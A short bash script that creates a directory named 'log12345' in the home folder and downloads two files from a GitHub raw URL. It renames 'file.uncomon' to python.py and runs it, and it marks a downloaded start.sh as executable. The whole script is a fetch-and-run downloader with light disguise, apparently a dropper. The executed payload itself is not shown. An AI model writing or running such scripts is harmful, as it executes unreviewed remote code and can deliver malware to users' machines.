#!/bin/bash
cd ~/
mkdir log12345
cd ~/log12345/
wget https://raw.githubusercontent.com/Firexlator/website/main/file.uncomon
wget https://raw.githubusercontent.com/Firexlator/website/main/start.sh
mv file.uncomon python.py
chmod 755 ./start.sh
python ./python.py
